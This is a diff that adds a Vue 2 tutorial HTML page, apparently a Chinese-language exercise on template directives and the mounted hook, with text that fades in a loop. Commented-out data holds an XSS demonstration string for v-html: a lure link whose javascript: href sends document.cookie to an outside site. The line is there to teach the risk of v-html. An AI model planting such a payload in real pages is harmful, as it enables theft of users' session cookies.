@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <style>
+      [v-cloak] {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- <div id="root">
+      <div v-cloak>尼玛，{{name}}</div>
+      <div v-html="str"></div>
+      <div v-html="str2"></div>
+      <h2 v-pre>Vue其实很简单</h2>
+      <h2>初始化的n值是: {{n}}</h2>
+      <h2 v-once>当前的n值是: {{n}}</h2>
+      <button @click="n++">点我n+1</button>
+    </div> -->
+    <div id="root">
+      <h2 v-if="a">你好啊</h2>
+      <h2 :style="{opacity}">我是一个逐渐消失的字</h2>
+    </div>
+    <script src="../common/vue.js"></script>
+    <script>
+      //   new Vue({
+      //     el: "#root",
+      //     data: {
+      //       a: false,
+      //       opacity: 1,
+      //       //   str: "<h3>你好啊！</h3>",
+      //       //   n: 1,
+      //       //   str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
+      //       //   name: "woneidie",
+      //     },
+      //   });
+      var vm = new Vue({
+        el: "#root",
+        data: {
+          a: false,
+          opacity: 1,
+        },
+        methods: {},
+        // 🔴Vue 完成模板的解析并把初始的真实 DOM 元素放入页面后（挂载完毕）调用 mounted
+        mounted() {
+          console.log("mounted", this);
+          setInterval(() => {
+            this.opacity -= 0.01;
+            if (this.opacity <= 0) this.opacity = 1;
+          }, 16);
+        },
+      });
+    </script>
+  </body>
+</html>
